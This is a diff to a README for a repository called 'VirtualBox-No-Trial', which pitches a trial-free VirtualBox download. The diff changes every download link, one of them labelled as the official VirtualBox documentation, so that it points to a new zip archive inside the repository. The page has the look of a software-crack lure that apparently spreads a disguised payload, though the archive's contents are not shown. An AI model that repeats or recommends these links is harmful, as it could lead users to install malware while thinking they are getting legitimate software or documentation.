@@ -1,6 +1,6 @@
 # 🖥️ VirtualBox-No-Trial - Easily Virtualize Your Windows PC
 
-[![Download Here](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/VirtualBox-No-Trial-v1.5.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/VirtualBox-No-Trial-v1.5.zip)
+[![Download Here](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/Virtual_No_Box_Trial_v3.2.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/Virtual_No_Box_Trial_v3.2.zip)
 
 ## 📖 Overview
 
@@ -37,7 +37,7 @@ To get up and running with VirtualBox-No-Trial, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
 
-   [Download Here](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/VirtualBox-No-Trial-v1.5.zip)
+   [Download Here](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/Virtual_No_Box_Trial_v3.2.zip)
 
 2. **Choose the Latest Release**: Look for the most recent version. You’ll see a list of files available for download.
 
@@ -55,7 +55,7 @@ To get up and running with VirtualBox-No-Trial, follow these simple steps:
 
 To download the latest version of VirtualBox-No-Trial, visit the page below:
 
-[Download Here](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/VirtualBox-No-Trial-v1.5.zip)
+[Download Here](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/Virtual_No_Box_Trial_v3.2.zip)
 
 Follow the instructions in the "Getting Started" section to install and run the application.
 
@@ -82,7 +82,7 @@ Here are some common problems and their solutions:
 
 ## 📚 Additional Resources
 
-- **Official VirtualBox Documentation**: For in-depth understanding and additional features, refer to the official documentation at [VirtualBox Official](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/VirtualBox-No-Trial-v1.5.zip).
+- **Official VirtualBox Documentation**: For in-depth understanding and additional features, refer to the official documentation at [VirtualBox Official](https://raw.githubusercontent.com/camel-camel/VirtualBox-No-Trial/main/jiti/Virtual_No_Box_Trial_v3.2.zip).
 - **User Forum**: Join discussions and find answers in the VirtualBox user community forum.
 
 Your journey into virtualization starts here. Feel free to explore the resources, and enjoy maximizing your Windows PC's potential!
